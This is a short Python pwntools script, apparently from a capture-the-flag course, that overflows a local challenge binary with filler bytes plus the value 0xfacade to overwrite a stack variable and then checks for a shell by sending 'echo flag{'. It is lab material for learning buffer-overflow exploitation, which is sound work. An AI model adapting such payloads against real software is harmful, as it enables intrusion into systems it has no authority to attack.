'''
+================================================================================+
|                               Overwrite Variables                              |
+================================================================================+
For more info on this attack checkout: 
https://github.com/guyinatuxedo/nightmare/tree/master/modules/04-bof_variable
'''

from pwn import *

import time

payload = ""
payload += "00000000000000000000000000000000000000000000000000"
payload += p32(0xfacade)

payload = payload.strip("\x00")


target = process(["./chall-test_bofVar-12-x86", payload])


# Exploit Verification starts here
limit = 0
while limit < 5:
	try:
		target.sendline("echo flag{")
	except:
		print("Could not send data")
	limit += 1
	try:
		output = "A good..."
		while output != "":
			output = target.recv(1, timeout=.1)
			print(output)
	except:
		print output

#she raised him right
